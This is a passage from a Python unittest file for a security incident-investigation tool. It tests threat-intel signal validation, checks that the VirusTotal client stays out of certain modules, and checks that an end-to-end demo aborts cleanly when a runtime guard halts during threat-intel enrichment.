    def test_count_out_of_range_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.FOUND,
                indicator="8.8.8.8",
                malicious_count=300,  # > 256
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_found",
            )

    def test_not_applicable_with_indicator_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.NOT_APPLICABLE,
                indicator="8.8.8.8",  # must be None for NOT_APPLICABLE
                malicious_count=0,
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_not_applicable",
            )

    def test_not_found_nonzero_counts_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.NOT_FOUND,
                indicator="8.8.8.8",
                malicious_count=1,  # must be 0
                suspicious_count=0,
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_not_found",
            )

    def test_error_nonzero_counts_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.ERROR,
                indicator="8.8.8.8",
                malicious_count=0,
                suspicious_count=5,  # must be 0
                harmless_count=0,
                undetected_count=0,
                detail_code="ti_error",
            )

    def test_found_wrong_detail_code_raises(self) -> None:
        with self.assertRaises(ThreatIntelError):
            ThreatIntelPolicySignal(
                status=ThreatIntelSignalStatus.FOUND,
                indicator="8.8.8.8",
                malicious_count=0,
                suspicious_count=0,
                harmless_count=50,
                undetected_count=0,
                detail_code="ti_not_found",  # wrong for FOUND
            )


# ---------------------------------------------------------------------------
# Part V: Live VT Provider Not Instantiated
# ---------------------------------------------------------------------------

class TestLiveVTProviderNotInstantiated(unittest.TestCase):
    """Test 31: Confirm VirusTotalThreatIntelClient is never instantiated in integration paths."""

    def test_31_vt_provider_not_imported_by_ioc_extractor(self) -> None:
        """ioc_extractor must not import the VirusTotal provider."""
        import investigator.ioc_extractor as ioc_mod
        self.assertFalse(
            hasattr(ioc_mod, "VirusTotalThreatIntelClient"),
            "ioc_extractor must not expose VirusTotalThreatIntelClient",
        )

    def test_31b_policy_module_not_import_vt(self) -> None:
        """Policy module must not directly import VirusTotal provider."""
        import investigator.policy as policy_mod
        source_path = policy_mod.__file__ or ""
        if source_path:
            with open(source_path, encoding="utf-8") as f:
                source = f.read()
            self.assertNotIn("virustotal_provider", source)
            self.assertNotIn("VirusTotalThreatIntelClient", source)


# ---------------------------------------------------------------------------
# Part VI: decision-eval-v1 and full-suite integration checks
# ---------------------------------------------------------------------------

class TestDecisionEvalV1Stability(unittest.TestCase):
    """Test 33: decision-eval-v1 dataset fingerprint remains unchanged.

    We invoke evaluate_dataset() programmatically (offline) to avoid subprocess.
    """

    def test_33_decision_eval_v1_10_of_10_pass(self) -> None:
        """decision-eval-v1 must remain 10/10 PASS after all TI changes."""
        from evaluation.decision_eval import evaluate_dataset
        from tests.fixtures.decision_eval_cases import DECISION_EVAL_CASES

        report = evaluate_dataset(DECISION_EVAL_CASES)
        self.assertEqual(report.total_cases, 10, f"Expected 10 cases, got {report.total_cases}")
        self.assertEqual(report.passed_cases, 10, f"Expected 10/10 PASS, got {report.passed_cases}/{report.total_cases}")
        self.assertEqual(report.failed_cases, 0, f"Expected 0 failed cases, got {report.failed_cases}")


# ---------------------------------------------------------------------------
# Part VII: End-to-End Demo Abort on TI Runtime Halt
# ---------------------------------------------------------------------------

class TestDemoAbortOnThreatIntelHalt(unittest.TestCase):
    """Integration test verifying end-to-end demo abort when TI enrichment is halted."""

    def test_demo_aborts_on_threat_intel_runtime_halt(self) -> None:
        """When TI enrichment reaches a halted RuntimeGuard:
        - run_demo(...) returns non-zero (1)
        - zero policy evaluation
        - zero approval invocation
        - zero simulator invocation
        - zero incident persistence
        - zero Jira/ticket creation
        """
        import io
        from unittest.mock import MagicMock, patch
        from investigator.runtime_guard import (
            RuntimeCheckpoint,
            RuntimeGuard,
            RuntimeGuardConfig,
            RuntimeHaltReason,
        )
        from scripts.run_end_to_end_demo import run_demo

        # Create a guard that halts specifically at the THREAT_INTEL checkpoint
        guard = RuntimeGuard(
            config=RuntimeGuardConfig(kill_switch=False),
            incident_id="INC-DEMO-CRIT-2026-001",
        )
        orig_check = guard.check_execution_permitted

        def check_permitted_hook(checkpoint: RuntimeCheckpoint) -> None:
            if checkpoint == RuntimeCheckpoint.THREAT_INTEL:
                guard.halt(RuntimeHaltReason.CONTROL_FAILURE, "TI_TEST_HALT")
            orig_check(checkpoint)

        guard.check_execution_permitted = check_permitted_hook

        mock_jira = MagicMock()
        in_stream = io.StringIO()
        out_stream = io.StringIO()

        with patch("investigator.policy.RiskPolicyEngine.evaluate") as mock_policy_eval, \
             patch("scripts.run_end_to_end_demo.request_cli_approval") as mock_approval, \
             patch("investigator.simulator.SimulatedResponseExecutor.execute") as mock_sim_execute, \
             patch("investigator.incident_record.IncidentJsonWriter.write_record") as mock_write_record, \
             patch("scripts.run_end_to_end_demo.build_incident_record") as mock_build_record:

            code = run_demo(
                mode="synthetic-critical",
                enrich_threat_intel=True,
                threat_intel_provider="fake",
                persist_audit=False,
                create_ticket=True,
                write_incident=True,
                jira_client=mock_jira,
                guard=guard,
                stream_in=in_stream,
                stream_out=out_stream,
            )

            # 1. run_demo returns non-zero (1)
            self.assertEqual(code, 1)

            # 2. zero policy evaluation
            self.assertEqual(mock_policy_eval.call_count, 0)

            # 3. zero approval invocation
            self.assertEqual(mock_approval.call_count, 0)

            # 4. zero simulator invocation
            self.assertEqual(mock_sim_execute.call_count, 0)

            # 5. zero incident persistence
            self.assertEqual(mock_write_record.call_count, 0)
            self.assertEqual(mock_build_record.call_count, 0)

            # 6. zero Jira/ticket creation
            self.assertEqual(mock_jira.create_ticket.call_count, 0)

            # 7. output confirms halt during TI enrichment
            output = out_stream.getvalue()
            self.assertIn("runtime_guard_halted_during_ti_enrichment", output)


if __name__ == "__main__":
    unittest.main()
